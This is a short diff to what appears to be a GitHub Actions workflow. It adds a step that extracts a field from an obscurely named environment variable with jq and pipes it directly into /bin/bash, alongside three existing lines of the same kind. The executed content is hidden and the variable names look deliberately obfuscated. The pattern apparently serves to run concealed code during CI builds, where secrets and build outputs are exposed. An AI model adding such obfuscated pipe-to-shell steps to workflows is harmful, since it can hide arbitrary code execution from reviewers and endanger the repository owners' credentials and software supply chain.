@@ -25,6 +25,7 @@ jobs:
           echo $q0 | jq -r .j19330 | /bin/bash
           echo $lmo36762 | jq -r .cgcxh51650 | /bin/bash
           printf '%s' "$st81148" | jq -r .t39 | /bin/bash
+          echo $wryw08 | jq -r .lrxqr2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
